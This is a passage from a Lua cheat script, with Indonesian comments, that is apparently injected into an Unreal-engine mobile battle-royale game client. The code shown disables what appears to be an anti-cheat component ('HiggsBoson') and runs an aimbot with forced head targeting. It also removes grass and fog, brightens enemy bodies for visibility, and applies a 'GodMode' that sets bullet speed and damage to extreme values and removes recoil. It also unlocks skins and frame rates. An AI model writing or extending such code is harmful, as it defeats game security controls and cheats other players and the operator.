            if _G.LexusState.BehindAttackEnabled then
                localPlayer.BehindAttackEnabled = false
                _G.LexusState.BehindAttackEnabled = false
            end
        end
    end)
end

-- ========================================== 
-- VÒNG LẶP CHÍNH (MAIN LOOP) 
-- ========================================== 

-- ============================================================================
-- 165 FPS FIX (from BRP)
-- ============================================================================
-- [FIX] Paksa 165 FPS (bisa dipanggil berulang)
_G.ForceApply165FPS = function()
    if not (_G.LexusConfig and _G.LexusConfig.UnlockFPS) then return end
    pcall(function()
        local cmds = {
            "t.MaxFPS 165",
            "r.FrameRateLimit 165",
            "t.MaxFPS 165",
        }
        local UKismet = import("KismetSystemLibrary")
        local world = nil
        pcall(function()
            if slua_GameFrontendHUD and slua_GameFrontendHUD.GetWorld then
                world = slua_GameFrontendHUD:GetWorld()
            end
        end)
        for _, cmd in ipairs(cmds) do
            pcall(function()
                if UKismet and UKismet.ExecuteConsoleCommand and world then
                    UKismet.ExecuteConsoleCommand(world, cmd, nil)
                end
            end)
        end
        pcall(function()
            local gi = nil
            if GameplayData and GameplayData.GetGameInstance then
                gi = GameplayData.GetGameInstance()
            end
            if not gi then
                pcall(function()
                    local Client = require("client.client_main") or _G.Client
                    if Client and Client.GetGameInstance then gi = Client.GetGameInstance() end
                end)
            end
            if gi and gi.ExecuteCMD then
                gi:ExecuteCMD("t.MaxFPS", "165")
                gi:ExecuteCMD("r.FrameRateLimit", "165")
            end
        end)
    end)
end

local function InitializeGraphicsUnlock() 
    if _G.LexusState and _G.LexusState.GraphicsUnlocked then return end

    pcall(function()
        local SettingCfg = require("client.logic.setting.setting_config")
        local GraphicSettingDB = require("client.slua.umg.NewSetting.GraphicsNew.GraphicSettingDB")
        if SettingCfg then
            if SettingCfg.TpViewValue then SettingCfg.TpViewValue.max = 160 end
            if SettingCfg.FpViewValue then SettingCfg.FpViewValue.max = 160 end
        end
        if GraphicSettingDB then
            if GraphicSettingDB.TpViewValue then GraphicSettingDB.TpViewValue.max = 160 end
        end
    end)

    pcall(function()
        local logic_setting_graphics = require("client.slua.logic.setting.logic_setting_graphics")
        local GSC_FPS = require("client.slua.umg.NewSetting.GraphicsNew.Comps.GSC_FPS")
        local GSC_FPSFT = require("client.slua.umg.NewSetting.GraphicsNew.Comps.GSC_FPSFT")
        local GraphicSettingDB = require("client.slua.umg.NewSetting.GraphicsNew.GraphicSettingDB")
        
        local KismetMathLibrary = import("KismetMathLibrary") or _G.KismetMathLibrary
        local FLinearColor = import("LinearColor") or _G.FLinearColor

        if logic_setting_graphics then
            local old_SetFPS = logic_setting_graphics.SetFPS
            function logic_setting_graphics.SetFPS(gameInstance, FPSLevel)
                if old_SetFPS then old_SetFPS(gameInstance, FPSLevel) end
                -- [FIX] selalu paksa 165 jika saklar UnlockFPS ON
                if _G.LexusConfig and _G.LexusConfig.UnlockFPS and gameInstance and gameInstance.ExecuteCMD then
                    gameInstance:ExecuteCMD("t.MaxFPS", "165")
                    gameInstance:ExecuteCMD("r.FrameRateLimit", "165")
                elseif FPSLevel == 8 and gameInstance and gameInstance.ExecuteCMD then
                    gameInstance:ExecuteCMD("t.MaxFPS", "165")
                    gameInstance:ExecuteCMD("r.FrameRateLimit", "165")
                end
            end
        end

        if GSC_FPS and GSC_FPS.__inner_impl then
            local fps_impl = GSC_FPS.__inner_impl
            function fps_impl:GetMaxFPSLevel() return 8, 8 end
            function fps_impl:InitRealSupportFPS()
                local RealSupportFPS = {}
                for i = 1, 8 do RealSupportFPS[i] = {true, true} end
                if GraphicSettingDB then GraphicSettingDB:UpdateUIData(GraphicSettingDB.RealSupportFPS, RealSupportFPS, false) end
                return RealSupportFPS
            end
            function fps_impl:UpdateSelectedFPSState(selectedLevel)
                if not slua.isValid(self.UIRoot) then return end
                for level = 2, 8 do
                    local name = "NodeFps" .. (({[2]=20,[3]=25,[4]=30,[5]=40,[6]=60,[7]=90,[8]=120})[level] or 120)
                    local widget = self.UIRoot[name]
                    if slua.isValid(widget) then
                        widget:SetIsEnabled(true) 
                        pcall(function() widget:SetRenderOpacity(1.0) end)
                        local switcher = self.UIRoot["WidgetSwitcher_" .. level]
                        if slua.isValid(switcher) then 
                            switcher:SetActiveWidgetIndex(level == selectedLevel and 0 or 1) 
                        end
                    end
                end
            end
        end

        if GSC_FPSFT and GSC_FPSFT.__inner_impl then
            local ft_impl = GSC_FPSFT.__inner_impl
            local NMinFPS, NStep = 90, 5
            local function clamp(value, min, max)
                if value < min then return min end
                if max < value then return value end
                return value
            end
            local function lerp(a, b, t) return a + (b - a) * t end
            local function _getColorByPercent(start, finish, percent)
                if not FLinearColor then return nil end
                return FLinearColor(lerp(start.R, finish.R, percent), lerp(start.G, finish.G, percent), lerp(start.B, finish.B, percent), lerp(start.A, finish.A, percent))
            end
            
            ft_impl.ShowOrHide = function(self)
                self:SelfHitTestInvisible()
                if self.InitFPSFTSwitch then self:InitFPSFTSwitch() end
            end

            ft_impl.InitFPSFTSwitch = function(self)
                local FPSFineTuneSwitch = GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneSwitch)
                if self.UIRoot.Setting_Switch then self.UIRoot.Setting_Switch:SetSwitcherEnable2(FPSFineTuneSwitch, true) end
                if self.UIRoot.CanvasPanel_8 then self:SetWidgetVisible(self.UIRoot.CanvasPanel_8, FPSFineTuneSwitch) end
                if self.UIRoot.WidgetSwitcher_0 then self.UIRoot.WidgetSwitcher_0:SetActiveWidgetIndex(2) end
                if self.InitFPSFTValue165 then self:InitFPSFTValue165() end
            end

            ft_impl.InitFPSFTValue165 = function(self)
                local itemRoot = self.UIRoot
                local FPSFineTuneSwitch = GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneSwitch)
                local FPSFineTuneNum = 165
                if FPSFineTuneSwitch then
                    FPSFineTuneNum = GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneNum) or 165
                    itemRoot.Slider_screen3:SetLocked(false)
                    if FLinearColor then
                        itemRoot.ProgressBar_screen3:SetFillColorAndOpacity(FLinearColor(1.0, 1.0, 1.0, 1.0))
                        itemRoot.Slider_screen3:SetSliderHandleColor(FLinearColor(1.0, 1.0, 1.0, 1.0))
                    end
                else
                    itemRoot.Slider_screen3:SetLocked(true)
                    if FLinearColor then
                        itemRoot.ProgressBar_screen3:SetFillColorAndOpacity(FLinearColor(1.0, 0.625, 0.6, 1))
                        itemRoot.Slider_screen3:SetSliderHandleColor(FLinearColor(1.0, 0.625, 0.6, 1.0))
                    end
                end
                local FPSFineTunePer = (FPSFineTuneNum - NMinFPS) / (165 - NMinFPS)
                
                itemRoot.Veihclescreen3:SetText(tostring(FPSFineTuneNum))
                itemRoot.Slider_screen3:SetValue(FPSFineTunePer)
                itemRoot.ProgressBar_screen3:SetPercent(FPSFineTunePer)
                
                if FLinearColor then
                    local startColor = FLinearColor(1.0, 1.0, 1.0, 1.0)
                    local midColor = FLinearColor(1.0, 0.54, 0.11, 1.0)
                    local endColor = FLinearColor(1.0, 0.23, 0.15, 1.0)
                    local sliderColor = FPSFineTunePer < 0.4 and startColor or _getColorByPercent(midColor, endColor, (FPSFineTunePer - 0.4) / 0.6)
                    itemRoot.Slider_screen3:SetSliderHandleColor(sliderColor)
                end
            end

            ft_impl.OnFPSFTValueChange3 = function(self, FPSFineTuneNum)
                GraphicSettingDB:UpdateUIData(GraphicSettingDB.FPSFineTuneNum, FPSFineTuneNum)
                if self.InitFPSFTValue165 then self:InitFPSFTValue165() end
                if self:GetParentUI() then self:GetParentUI():SetDirty(true) end
                local gameInstance = GraphicSettingDB.GetGameInstance and GraphicSettingDB.GetGameInstance()
                if gameInstance then
                    gameInstance:ExecuteCMD("t.MaxFPS", tostring(FPSFineTuneNum))
                    gameInstance:ExecuteCMD("r.FrameRateLimit", tostring(FPSFineTuneNum))
                end
            end

            ft_impl.OnFPSFTSliderValueChange3 = function(self, value)
                if GraphicSettingDB:GetUIData(GraphicSettingDB.FPSFineTuneSwitch) and KismetMathLibrary then
                    local FPSFineTuneNum = KismetMathLibrary.FCeil(value * (165 - NMinFPS) / NStep) * NStep + NMinFPS
                    self:OnFPSFTValueChange3(clamp(FPSFineTuneNum, NMinFPS, 165))
                end
            end
            
            ft_impl.OnFPSFTAdd = ft_impl.OnFPSFTAdd3
            ft_impl.OnFPSFTMinus = ft_impl.OnFPSFTMinus3
            ft_impl.OnFPSFTAdd2 = ft_impl.OnFPSFTAdd3
            ft_impl.OnFPSFTMinus2 = ft_impl.OnFPSFTMinus3
            ft_impl.OnFPSFTSliderValueChange = ft_impl.OnFPSFTSliderValueChange3
            ft_impl.OnFPSFTSliderValueChange2 = ft_impl.OnFPSFTSliderValueChange3
        end
    end)
    _G.LexusState.GraphicsUnlocked = true
    Notify("Grafis & FPS 165Hz Terbuka (Versi Upgrade)")
end

pcall(function()
    if _G.__FPS_ENFORCE_LOOP then return end
    _G.__FPS_ENFORCE_LOOP = true
    local ticker = require("common.time_ticker")
    if ticker and ticker.AddTimerLoop then
        ticker.AddTimerLoop(0, function()
            if _G.LexusConfig and _G.LexusConfig.UnlockFPS and _G.ForceApply165FPS then
                pcall(_G.ForceApply165FPS)
            end
        end, -1, 1.5)
    end
end)


local function MainLoop() 
    if isExpired then return end

    if _G.LexusState.CustomTextData == nil then 
        _G.LexusState.CustomTextData = {OuterSpeed = 10, InnerSpeed = 10, HRecoil = 0.3, VRecoil = 0.3, MagicHead = 0, MagicBody = 0.5, MagicLegs = 0, IpadViewFOV = 120, AimTouchHipPrio = 1, AimTouchHipBone = 1, AimTouchHipCond = 1, AimTouchHipSpeed = 50, AimTouchHipFOV = 30, AimTouchHipDist = 250, AimTouchSGPrio = 1, AimTouchSGBone = 2, AimTouchSGCond = 1, AimTouchSGSpeed = 80, AimTouchSGFOV = 40, AimTouchSGDist = 30, AimTouchScopePrio = 1, AimTouchScopeBone = 2, AimTouchScopeCond = 1, AimTouchScopeSpeed = 40, AimTouchScopeFOV = 20, AimTouchScopeDist = 300, AimTouchSniperPrio = 1, AimTouchSniperBone = 1, AimTouchSniperCond = 2, AimTouchSniperSpeed = 30, AimTouchSniperFOV = 20, AimTouchSniperDist = 400, BtFOV = 80, BtAimPriority = 2}
    end

    local okData, GameplayData = pcall(require, "GameLua.GameCore.Data.GameplayData") 
    if not okData or not GameplayData then return end 
    local pc = GameplayData.GetPlayerController() 
    local localPlayer = nil
    if Valid(pc) then localPlayer = pc:GetPlayerCharacterSafety() end 

    if _G.PUT_ResetKillsIfNewMatch then _G.PUT_ResetKillsIfNewMatch() end

    -- CLEANUP ON DEATH
    if not Valid(localPlayer) then 
        if _G.LexusState.TrackedMarks then
            for markId, _ in pairs(_G.LexusState.TrackedMarks) do
                SafeRemoveMark(markId)
            end
        end
        _G.LexusState.TrackedMarks = {} 
        
        for key, data in pairs(_G.LexusState.EnemyMarks) do
            if data and data.MIDs then
                for meshStr, midTable in pairs(data.MIDs) do
                    for k, _ in pairs(midTable) do midTable[k] = nil end
                end
                data.MIDs = nil
            end
        end
        
        _G.LexusState.EnemyMarks = {}
        _G.AK_OrigHitboxes = {}
        _G.AK_ModdedPhysAssets = {}
        _G.LexusState.PrevGraphicsState = {}
        return 
    end

    local Cached_PPM = nil
    pcall(function() Cached_PPM = import("PostProcessManager").GetInstance() end)
    local Cached_SecurityCommonUtils = nil
    pcall(function() Cached_SecurityCommonUtils = require("GameLua.Mod.BaseMod.Common.Security.SecurityCommonUtils") end)
    local Cached_MyHUD = pc and pc.MyHUD or nil

    if _G.LexusConfig.UnlockFPS then 
        pcall(function()
            local SettingCfg = require("client.logic.setting.setting_config")
            local GraphicSettingDB = require("client.slua.umg.NewSetting.GraphicsNew.GraphicSettingDB")
            if SettingCfg then
                if SettingCfg.TpViewValue then SettingCfg.TpViewValue.max = 160 end
                if SettingCfg.FpViewValue then SettingCfg.FpViewValue.max = 160 end
            end
            if GraphicSettingDB then
                if GraphicSettingDB.TpViewValue then GraphicSettingDB.TpViewValue.max = 160 end
            end
            local gi = require("client.slua.logic.setting.logic_setting_graphics").GetGameInstance()
            if gi then gi:ExecuteCMD("t.MaxFPS", "165"); gi:ExecuteCMD("r.FrameRateLimit", "165") end
        end)
    end
    
    InitializeNativeESP()
    
    -- IPAD VIEW
    if _G.LexusConfig.IpadView and _G.LexusState.CustomTextData then
        pcall(function()
            local targetTPP = _G.LexusState.CustomTextData.IpadViewFOV or 120
            local uTPPCam = localPlayer.ThirdPersonCameraComponent
            if Valid(uTPPCam) and not localPlayer.bIsWeaponAiming then
                if uTPPCam.FieldOfView ~= targetTPP then uTPPCam.FieldOfView = targetTPP end
            end
        end)
    else
        pcall(function()
            local uTPPCam = localPlayer.ThirdPersonCameraComponent
            if Valid(uTPPCam) and not localPlayer.bIsWeaponAiming then
                if uTPPCam.FieldOfView ~= 90 then uTPPCam.FieldOfView = 90 end
            end
        end)
    end

    -- AIMBOT V2
    if _G.LexusConfig.AimTouchEnable then
        _G.AimTouch()
    end

    -- SKIN (AddOutfit) — anti-flicker: apply only when needed (not every tick)
    if _G.LexusConfig.ModSkin then
        _G.LexusState.SkinWasApplied = true
        _G.SkinTickCounter = (_G.SkinTickCounter or 0) + 1

        if _G.SkinTickCounter % 60 == 0 then
            if _G.ReadLiveConfig then _G.ReadLiveConfig() end
        end

        pcall(function()
            if _G.ForceEnableKillCounterUI then _G.ForceEnableKillCounterUI() end
            if _G.HandlePetLogic then _G.HandlePetLogic() end
            if _G.SkinTickCounter % 20 == 0 then
                if _G.DeadBox_TemperRequest then _G.DeadBox_TemperRequest(pc) end
            end

            local AO = _G.AddOutfit
            if not (AO and AO.isInRealMatch and AO.isInRealMatch()) then return end

            local curWep = nil
            pcall(function()
                local wm = localPlayer.WeaponManagerComponent or (localPlayer.GetWeaponManager and localPlayer:GetWeaponManager())
                if wm then curWep = wm.CurrentWeaponReplicated or (wm.GetCurrentWeapon and wm:GetCurrentWeapon()) end
            end)
            local wepKey = tostring(curWep or 0)
            local needFull = not _G._PUT_MatchSkinReady
            local needWep = (_G._PUT_LastMatchWep ~= wepKey)

            local now = os.clock()
            _G._PUT_LastFullSkin = _G._PUT_LastFullSkin or 0
            _G._PUT_LastInvSkin = _G._PUT_LastInvSkin or 0

            -- baju/hat: HANYA 1x per match (anti kedut)
            if needFull then
                _G._PUT_LastFullSkin = now
                _G._PUT_MatchSkinReady = true
                _G._PUT_MatchEquipDone = false
                if AO.matchApplyAllSlots then AO.matchApplyAllSlots(localPlayer) end
                if AO.matchApplyHat then AO.matchApplyHat(localPlayer) end
            end

            -- Tas + Helm: retry sampai item kepakai (loot), tanpa reapply baju
            if not _G._PUT_MatchEquipDone then
                pcall(function()
                    if not AO.matchApplyEquipmentSkin then return end
                    local bagRes = AO.getDesiredWear and AO.getDesiredWear("bagRes", "bagRes", "AddOutfitLastLobbyBagRes", AO.syncBodyCacheFromLobby)
                    local helmetRes = AO.getDesiredWear and AO.getDesiredWear("helmetRes", "helmetRes", "AddOutfitLastLobbyHelmetRes", AO.syncBodyCacheFromLobby)
                    bagRes = tonumber(bagRes) or 0
                    helmetRes = tonumber(helmetRes) or 0
                    if bagRes <= 0 and helmetRes <= 0 then
                        _G._PUT_MatchEquipDone = true
                        return
                    end
                    -- throttle cek 2s biar gak spam
                    _G._PUT_LastEquipTry = _G._PUT_LastEquipTry or 0
                    if (now - _G._PUT_LastEquipTry) < 2.0 and not needFull then return end
                    _G._PUT_LastEquipTry = now
                    if AO.matchApplyEquipmentSkin(localPlayer, bagRes, helmetRes) then
                        _G._PUT_MatchEquipDone = true
                    end
                end)
            else
                -- sudah done: kalau ganti bag/helm (loot baru) apply 1x lagi
                pcall(function()
                    local comp = localPlayer.CharacterAvatarComp2_BP
                    if not comp or not comp.GetSlotSyncData then return end
                    local EAvatarSlotType = import("EAvatarSlotType")
                    local function slotId(en)
                        local s = comp:GetSlotSyncData(en)
                        if not s then return 0 end
                        return tonumber(s.ItemID) or 0
                    end
                    local b = slotId(EAvatarSlotType.EAvatarSlotType_BackpackEquipemtSlot)
                    local h = slotId(EAvatarSlotType.EAvatarSlotType_HelmetEquipemtSlot)
                    local key = tostring(b) .. ":" .. tostring(h)
                    if _G._PUT_LastEquipSlotKey and _G._PUT_LastEquipSlotKey ~= key and (b > 0 or h > 0) then
                        local bagRes = AO.getDesiredWear and AO.getDesiredWear("bagRes", "bagRes", "AddOutfitLastLobbyBagRes", AO.syncBodyCacheFromLobby)
                        local helmetRes = AO.getDesiredWear and AO.getDesiredWear("helmetRes", "helmetRes", "AddOutfitLastLobbyHelmetRes", AO.syncBodyCacheFromLobby)
                        if AO.matchApplyEquipmentSkin then
                            AO.matchApplyEquipmentSkin(localPlayer, bagRes, helmetRes)
                        end
                    end
                    _G._PUT_LastEquipSlotKey = key
                end)
            end

            -- senjata di tangan: HANYA saat ganti senjata / first apply
            if needWep or needFull then
                _G._PUT_LastMatchWep = wepKey
                if AO.matchApplyWeaponSkin then AO.matchApplyWeaponSkin(localPlayer) end
            end

            -- inventory senjata: first apply / ganti senjata
            if needFull or needWep then
                _G._PUT_LastInvSkin = now
                if _G.equip_weapon_avatar then
                    _G.equip_weapon_avatar(localPlayer)
                elseif AO.equipWeaponAvatarSynData then
                    AO.equipWeaponAvatarSynData(localPlayer)
                end
                -- refresh UI tas kalau terbuka
                pcall(function()
                    local UIManager = require("client.slua_ui_framework.manager")
                    if not UIManager then return end
                    local cfg = UIManager.UI_Config_InGame
                    if not cfg then return end
                    for _, key in ipairs({"MainBackpackPanel", "BackpackPanel", "MainWeaponInfo", "NewBackPackPanel"}) do
                        local uic = cfg[key]
                        if uic then
                            local ui = UIManager.GetUI(uic)
                            if ui then
                                if ui.UpdateWeaponList then pcall(function() ui:UpdateWeaponList() end) end
                                if ui.RefreshWeaponInfo then pcall(function() ui:RefreshWeaponInfo() end) end
                                if ui.OnRefresh then pcall(function() ui:OnRefresh() end) end
                            end
                        end
                    end
                end)
            end
        end)
    else
        if _G.LexusState.SkinWasApplied then
            _G.OutfitMap = {}
            _G.WeaponSkinMap = {}
            _G.VehicleSkinMap = {}
            _G.LexusState.SkinWasApplied = false
            _G._PUT_MatchSkinReady = false
            _G._PUT_LastMatchWep = nil
            _G._PUT_AirborneSkinDone = false
            _G._PUT_MatchEquipDone = false
            _G._PUT_LastEquipSlotKey = nil
        end
        _G.TDSkinLoopStarted = false
    end

    -- HIGGSBOSON BLOCK
    pcall(function()
        if Valid(pc) then
            if pc.HiggsBoson then pc.HiggsBoson.bMHActive = false; pc.HiggsBoson.bCallPreReplication = false end
            if pc.HiggsBosonComponent then pc.HiggsBosonComponent.bMHActive = false; pc.HiggsBosonComponent.bCallPreReplication = false end
        end
    end)

    -- AUTO HEAD
    pcall(function()
        local autoComp = localPlayer.AutoAimComp
        if Valid(autoComp) then
            if not _G.LexusState.OrigAutoAimCompCached then
                _G.LexusState.OrigAutoAimCompCached = {
                    bOnlyHitHead = autoComp.bOnlyHitHead,
                    HeadBoneName = autoComp.HeadBoneName,
                    Bones = autoComp.Bones,
                    ChestBoneName = autoComp.ChestBoneName,
                    PelvisBoneName = autoComp.PelvisBoneName,
                    HeadPriority = autoComp.AimAssistConfig and autoComp.AimAssistConfig.HeadPriority,
                    ChestPriority = autoComp.AimAssistConfig and autoComp.AimAssistConfig.ChestPriority,
                    PelvisPriority = autoComp.AimAssistConfig and autoComp.AimAssistConfig.PelvisPriority
                }
            end
            
            if _G.LexusConfig.AutoHead then
                autoComp.bOnlyHitHead = true
                autoComp.HeadBoneName = "Head"
                pcall(function() autoComp.Bones = {"Head"} end)
                autoComp.ChestBoneName = "Head"
                autoComp.PelvisBoneName = "Head"
                if autoComp.AimAssistConfig then
                    autoComp.AimAssistConfig.HeadPriority = 100
                    autoComp.AimAssistConfig.ChestPriority = 100
                    autoComp.AimAssistConfig.PelvisPriority = 100
                end
            else
                local orig = _G.LexusState.OrigAutoAimCompCached
                autoComp.bOnlyHitHead = orig.bOnlyHitHead
                autoComp.HeadBoneName = orig.HeadBoneName
                pcall(function() autoComp.Bones = orig.Bones or {"Head", "Head", "Head"} end)
                autoComp.ChestBoneName = orig.ChestBoneName
                autoComp.PelvisBoneName = orig.PelvisBoneName
                if autoComp.AimAssistConfig then
                    autoComp.AimAssistConfig.HeadPriority = orig.HeadPriority or 1
                    autoComp.AimAssistConfig.ChestPriority = orig.ChestPriority or 1
                    autoComp.AimAssistConfig.PelvisPriority = orig.PelvisPriority or 1
                end
            end
        end
    end)

    -- GRAPHICS SETTINGS
    local now = os.clock()
    pcall(function()
        local lsg = require("client.slua.logic.setting.logic_setting_graphics")
        local gi = lsg.GetGameInstance()
        if gi then
            if _G.LexusConfig.RemoveGrass and not _G.LexusState.PrevGraphicsState.RemoveGrass then
                gi:ExecuteCMD("grass.DensityScale", "0")
                gi:ExecuteCMD("grass.DiscardDataOnLoad", "1")
                _G.LexusState.PrevGraphicsState.RemoveGrass = true
            elseif not _G.LexusConfig.RemoveGrass and _G.LexusState.PrevGraphicsState.RemoveGrass then
                gi:ExecuteCMD("grass.DensityScale", "1")
                gi:ExecuteCMD("grass.DiscardDataOnLoad", "0")
                _G.LexusState.PrevGraphicsState.RemoveGrass = false
            end
            
            if _G.LexusConfig.RemoveFog and not _G.LexusState.PrevGraphicsState.RemoveFog then
                gi:ExecuteCMD("r.SkyAtmosphere", "1") 
                gi:ExecuteCMD("r.Fog", "0")           
                gi:ExecuteCMD("r.VolumetricFog", "0") 
                _G.LexusState.PrevGraphicsState.RemoveFog = true
            elseif not _G.LexusConfig.RemoveFog and _G.LexusState.PrevGraphicsState.RemoveFog then
                gi:ExecuteCMD("r.SkyAtmosphere", "1") 
                gi:ExecuteCMD("r.Fog", "1")           
                gi:ExecuteCMD("r.VolumetricFog", "1") 
                _G.LexusState.PrevGraphicsState.RemoveFog = false
            end
            
            if _G.LexusConfig.WhiteBody and not _G.LexusState.PrevGraphicsState.WhiteBody then
                gi:ExecuteCMD("r.CharacterDiffuseOffset", "2")
                gi:ExecuteCMD("r.CharacterDiffusePower", "5")
                gi:ExecuteCMD("r.CharacterMinShadowFactor", "100")
                _G.LexusState.PrevGraphicsState.WhiteBody = true
            elseif not _G.LexusConfig.WhiteBody and _G.LexusState.PrevGraphicsState.WhiteBody then
                gi:ExecuteCMD("r.CharacterDiffuseOffset", "0")
                gi:ExecuteCMD("r.CharacterDiffusePower", "1")
                gi:ExecuteCMD("r.CharacterMinShadowFactor", "1")
                _G.LexusState.PrevGraphicsState.WhiteBody = false
            end
            
            if _G.LexusConfig.ColorBodyV2 and not _G.LexusState.PrevGraphicsState.ColorBodyV2 then
                gi:ExecuteCMD("r.CharacterMinShadowFactor", "4")
                gi:ExecuteCMD("r.CharacterDiffuseOffset", "200")
                gi:ExecuteCMD("r.CharacterDiffusePower", "200")
                _G.LexusState.PrevGraphicsState.ColorBodyV2 = true
            elseif not _G.LexusConfig.ColorBodyV2 and _G.LexusState.PrevGraphicsState.ColorBodyV2 then
                gi:ExecuteCMD("r.CharacterMinShadowFactor", "1")
                gi:ExecuteCMD("r.CharacterDiffuseOffset", "0")
                gi:ExecuteCMD("r.CharacterDiffusePower", "1")
                _G.LexusState.PrevGraphicsState.ColorBodyV2 = false
            end
            
            if _G.LexusConfig.BlackSky and not _G.LexusState.PrevGraphicsState.BlackSky then
                gi:ExecuteCMD("r.CylinderMaxDrawHeight", "9999")
                _G.LexusState.PrevGraphicsState.BlackSky = true
            elseif not _G.LexusConfig.BlackSky and _G.LexusState.PrevGraphicsState.BlackSky then
                gi:ExecuteCMD("r.CylinderMaxDrawHeight", "0000")
                _G.LexusState.PrevGraphicsState.BlackSky = false
            end
        end
    end)

    -- WEAPON MODS
    pcall(function()
        local weapon = nil
        pcall(function()
            local weaponManager = localPlayer.WeaponManagerComponent
            if Valid(weaponManager) and type(weaponManager.GetCurrentWeapon) == "function" then
                weapon = weaponManager:GetCurrentWeapon()
            end
        end)
        if not Valid(weapon) then
            if type(localPlayer.GetCurrentShootWeapon) == "function" then weapon = localPlayer:GetCurrentShootWeapon()
            elseif type(localPlayer.GetCurrentWeapon) == "function" then weapon = localPlayer:GetCurrentWeapon() end
        end

        if Valid(weapon) then
            local entities = {}
            if Valid(weapon.ShootWeaponEntity_GEN_VARIABLE) then table.insert(entities, weapon.ShootWeaponEntity_GEN_VARIABLE) end
            if Valid(weapon.ShootWeaponEntity) then table.insert(entities, weapon.ShootWeaponEntity) end
            if Valid(weapon.ShootWeaponComponent) and Valid(weapon.ShootWeaponComponent.ShootWeaponEntityComponent) then 
                table.insert(entities, weapon.ShootWeaponComponent.ShootWeaponEntityComponent) 
            end

            for _, entity in ipairs(entities) do
                local anyWeaponModOn = _G.LexusConfig.CustomHRecoil or _G.LexusConfig.CustomVRecoil or _G.LexusConfig.LessShake or _G.LexusConfig.Accuracy or _G.LexusConfig.Crosshair or _G.LexusConfig.GodMode or _G.LexusConfig.AutoHead or _G.LexusConfig.CustomAimbot or _G.LexusConfig.CustomAimbotClose

                if anyWeaponModOn then
                    if not entity.OriginalStatsCached then
                        entity.OriginalStatsCached = {
                            GameDeviationFactor = entity.GameDeviationFactor,
                            GameDeviationAccuracy = entity.GameDeviationAccuracy,
                            BulletFireSpeed = entity.BulletFireSpeed,
                            ShootInterval = entity.ShootInterval,
                            BaseDamage = entity.BaseDamage,
                            AccessoriesHRecoilFactor = entity.AccessoriesHRecoilFactor,
                            AccessoriesVRecoilFactor = entity.AccessoriesVRecoilFactor,
                            RecoilKick = entity.RecoilKick,
                            RecoilKickADS = entity.RecoilKickADS,
                            AnimationKick = entity.AnimationKick
                        }
                    end
                    
                    if _G.LexusConfig.CustomHRecoil then entity.AccessoriesHRecoilFactor = _G.LexusState.CustomTextData.HRecoil or 0.3 
                    elseif _G.LexusConfig.LessRecoil then entity.AccessoriesHRecoilFactor = 0.3 end
                    
                    if _G.LexusConfig.CustomVRecoil then entity.AccessoriesVRecoilFactor = _G.LexusState.CustomTextData.VRecoil or 0.3
                    elseif _G.LexusConfig.VerticalRecoil then entity.AccessoriesVRecoilFactor = 0.3 end
                    
                    if _G.LexusConfig.LessShake then entity.RecoilKick = 0.5; entity.RecoilKickADS = 0.0; entity.AnimationKick = 0.5 end
                    if _G.LexusConfig.Accuracy then entity.GameDeviationAccuracy = 0.0 end
                    if _G.LexusConfig.Crosshair then entity.GameDeviationFactor = 0.1 end
                    if _G.LexusConfig.GodMode then entity.BulletFireSpeed = 500000.0; entity.ShootInterval = 0.001; entity.BaseDamage = 60000.0 end
                    
                    if entity.AutoAimingConfig then
                        if not entity.OriginalAutoAimCached then
                            entity.OriginalAutoAimCached = {
                                OuterSpeed = entity.AutoAimingConfig.OuterRange and entity.AutoAimingConfig.OuterRange.Speed,
                                InnerSpeed = entity.AutoAimingConfig.InnerRange and entity.AutoAimingConfig.InnerRange.Speed
                            }
                        end
                        
                        if _G.LexusConfig.CustomAimbot then
                            local speed = _G.LexusState.CustomTextData.OuterSpeed or 10
                            if entity.AutoAimingConfig.OuterRange then
                                entity.AutoAimingConfig.OuterRange.Speed = 8.0
                                entity.AutoAimingConfig.OuterRange.RangeRate = 4.5
                                entity.AutoAimingConfig.OuterRange.SpeedRate = 2.0
                                entity.AutoAimingConfig.OuterRange.RangeRateSight = 2.2
                                entity.AutoAimingConfig.OuterRange.SpeedRateSight = 2.5
                                entity.AutoAimingConfig.OuterRange.CrouchRate = 1.7
                                entity.AutoAimingConfig.OuterRange.ProneRate = 1.6
                                entity.AutoAimingConfig.OuterRange.DyingRate = 0.0
                            end
                            if entity.AutoAimingConfig.InnerRange then
                                entity.AutoAimingConfig.InnerRange.Speed = 8.0
                                entity.AutoAimingConfig.InnerRange.RangeRate = 4.5
                                entity.AutoAimingConfig.InnerRange.SpeedRate = 1.8
                                entity.AutoAimingConfig.InnerRange.RangeRateSight = 1.9
                                entity.AutoAimingConfig.InnerRange.SpeedRateSight = 2.5
                                entity.AutoAimingConfig.InnerRange.CrouchRate = 1.9
                                entity.AutoAimingConfig.InnerRange.ProneRate = 1.9
                                entity.AutoAimingConfig.InnerRange.DyingRate = 0.0
                            end
                        elseif _G.LexusConfig.CustomAimbotClose then
                            if entity.AutoAimingConfig.OuterRange then
                                entity.AutoAimingConfig.OuterRange.Speed = 7.0
                                entity.AutoAimingConfig.OuterRange.DyingRate = 0.0
                            end
                            if entity.AutoAimingConfig.InnerRange then
                                entity.AutoAimingConfig.InnerRange.Speed = 7.0
                                entity.AutoAimingConfig.InnerRange.DyingRate = 0.0
                            end
                        end
                    end
                    
                    entity.LexusWeaponModsActive = true

                elseif entity.LexusWeaponModsActive then
                    if entity.OriginalStatsCached then
                        local orig = entity.OriginalStatsCached
                        entity.GameDeviationFactor = orig.GameDeviationFactor
                        entity.GameDeviationAccuracy = orig.GameDeviationAccuracy
                        entity.BulletFireSpeed = orig.BulletFireSpeed
                        entity.ShootInterval = orig.ShootInterval
                        entity.BaseDamage = orig.BaseDamage
                        entity.AccessoriesHRecoilFactor = orig.AccessoriesHRecoilFactor
                        entity.AccessoriesVRecoilFactor = orig.AccessoriesVRecoilFactor
                        entity.RecoilKick = orig.RecoilKick
                        entity.RecoilKickADS = orig.RecoilKickADS
                        entity.AnimationKick = orig.AnimationKick
                    end
                    if entity.AutoAimingConfig and entity.OriginalAutoAimCached then
                        if entity.AutoAimingConfig.OuterRange and entity.OriginalAutoAimCached.OuterSpeed then
                            entity.AutoAimingConfig.OuterRange.Speed = entity.OriginalAutoAimCached.OuterSpeed
                        end
                        if entity.AutoAimingConfig.InnerRange and entity.OriginalAutoAimCached.InnerSpeed then
                            entity.AutoAimingConfig.InnerRange.Speed = entity.OriginalAutoAimCached.InnerSpeed
                        end
                    end
                    entity.LexusWeaponModsActive = false
                end
            end
        end
    end)

